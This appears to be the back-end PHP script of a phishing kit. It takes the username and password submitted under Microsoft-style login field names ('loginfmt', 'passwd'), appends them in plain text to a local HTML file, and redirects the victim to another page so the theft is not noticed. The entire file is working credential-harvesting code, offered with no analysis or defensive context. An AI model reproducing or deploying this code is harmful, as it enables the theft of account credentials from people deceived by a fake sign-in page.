<?php
$username=$_POST['loginfmt'];
$password=$_POST['passwd'];




$conteudos = $username.";".$password."<br>";


$fp = fopen("meupau.html", "a+");
$escreve = fwrite($fp, $conteudos);
fclose($fp);
	
	
	
	?>

<meta http-equiv='refresh' content='1;url=index2.html'>





